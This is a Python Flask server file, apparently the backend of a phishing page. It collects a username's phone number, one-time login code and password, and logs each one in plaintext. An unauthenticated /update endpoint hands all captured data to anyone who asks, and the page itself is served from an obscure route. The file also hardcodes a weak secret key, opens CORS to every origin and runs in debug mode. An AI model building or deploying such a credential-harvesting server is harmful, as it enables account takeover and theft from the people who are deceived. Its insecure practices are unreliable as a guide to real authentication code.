from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from base import init_db, add_phone, add_code, give_all_update, add_password, get_db_connection
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
CORS(app)

init_db()

@app.route('/delete_user', methods=['POST'])
def handle_delete():
    try:
        data = request.get_json()
        
        username = data['username']
        if not username:
            return jsonify({'status': 'error', 'message': 'User not found'}), 404
        
        with get_db_connection() as conn:
            cursor = conn.cursor()
            # Удаляем только по username
            cursor.execute(
            'DELETE FROM users WHERE username = ?',
            (username,)
            )
            if cursor.rowcount > 0:
                return jsonify({'status': 'success', 'message': 'User deleted'})
            else:
                return jsonify({'status': 'error', 'message': 'User not found'}), 404
                
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/update', methods=['GET'])
def update():
    try:
        data = give_all_update()
        if data is not None:
            return jsonify({'status': 'success', 'data': data}), 200
        return jsonify({'status': 'error', 'message': 'No data available'}), 404
    except Exception as e:
        logger.error(f"Error in /update: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

@app.route('/password', methods=['POST'])
def handle_password():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
        user = data.get('username')
        password = data.get('password')
        
        if not user or not password:
            return jsonify({'status': 'error', 'message': 'Missing username or code'}), 400
        
        logger.info(f"Received code: user={user}, code={password}")
        
        if add_password(password, user):
            return jsonify({'status': 200, 'message': 'Code accepted'}), 200
        return jsonify({'status': 'error', 'message': 'User not found'}), 404
        
    except Exception as e:
        logger.error(f"Error in /code: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500


@app.route('/code', methods=['POST'])
def handle_code():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
        user = data.get('username')
        code = data.get('code')
        
        if not user or not code:
            return jsonify({'status': 'error', 'message': 'Missing username or code'}), 400
        
        logger.info(f"Received code: user={user}, code={code}")
        
        if add_code(code, user):
            return jsonify({'status': 200, 'message': 'Code accepted'}), 200
        return jsonify({'status': 'error', 'message': 'User not found'}), 404
        
    except Exception as e:
        logger.error(f"Error in /code: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

@app.route('/phone', methods=['POST'])
def handle_phone():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
        user = data.get('username')
        phone_number = data.get('phone')
        
        if not user or not phone_number:
            return jsonify({'status': 'error', 'message': 'Missing username or phone'}), 400
        
        logger.info(f"Received phone: user={user}, phone={phone_number}")
        
        if add_phone(phone_number, user):
            return jsonify({'status': 'code_sent', 'message': 'Phone number saved'}), 200
        return jsonify({'status': 'error', 'message': 'Phone number already exists'}), 409
        
    except Exception as e:
        logger.error(f"Error in /phone: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

@app.route('/z2tx8', methods=['GET'])
def main():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
